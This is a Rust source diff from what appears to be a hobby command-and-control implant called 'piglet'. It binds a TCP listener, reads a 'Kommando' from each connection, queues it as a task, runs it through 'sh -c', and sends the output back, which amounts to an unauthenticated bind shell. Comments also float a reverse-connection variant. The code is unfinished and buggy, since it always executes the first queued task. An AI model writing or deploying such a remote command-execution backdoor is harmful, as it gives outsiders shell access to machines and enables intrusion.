@@ -12,7 +12,7 @@ mod piglet;
 use crate::piglet::Piglet;
 mod tasks;
 
-fn get_command_from_stream(mut stream: TcpStream) -> String {
+fn get_command_from_stream(mut stream: &TcpStream) -> String {
     let mut buffer = [0; 1024];
     stream.read(&mut buffer).unwrap();
     let kommando = String::from_utf8_lossy(&buffer[..])
@@ -22,15 +22,18 @@ fn get_command_from_stream(mut stream: TcpStream) -> String {
     kommando
 }
 
-fn run_cmd_sh(piglet: Piglet, kommando: &str) -> Vec<u8> {
-
+fn run_cmd_sh(piglet: &Piglet) -> Vec<u8> {
     // we write the result of the command to the stdout stream and pass that to the TcpStream buffer as Vec<u8>
     let result = Command::new("sh")
         .arg("-c")
-        .arg(&kommando.trim())
+        .arg(piglet.tasklist.tasks[0].command.trim())
         .output()
         .expect("command execution failed");
-    if result 
+
+    /*
+    once we receive a Kommando we want to push it to the tasklist of the piglet
+    when we have the result/output we want to update the TaskStatus to "completed"
+    */
     result.stdout
 }
 
@@ -40,7 +43,8 @@ fn write_response(mut stream: TcpStream, message: Vec<u8>) {
 }
 
 fn main() {
-    let piglet: Piglet = Default::default();
+    let mut piglet: Piglet = Default::default();
+    println!("{piglet}");
     let listener =
         TcpListener::bind(format!("{}:{}", piglet.call_home_addr, piglet.bind_port,)).unwrap();
     // Result[OK] -> T -> unwrap takes this T or if Result[Err] panics with the Err
@@ -48,10 +52,14 @@ fn main() {
 
     for stream in listener.incoming() {
         let stream = stream.unwrap();
-        let _message = handle_connection(stream);
-        piglet.add_task(message);
+        let kommando = get_command_from_stream(&stream);
+        piglet.add_task(kommando);
+        println!("{piglet}");
+        // think about whether a giplet would be a reverse connection piglet. @Trismah's idea.
+        // riplet / steaklet / schnitzlet
 
-        println!("Connection established!");
+        let res = run_cmd_sh(&piglet);
+        write_response(stream, res);
         // next steps:
         // handle the stream and extract "Kommando"
         // how do we extract the body from the requests?
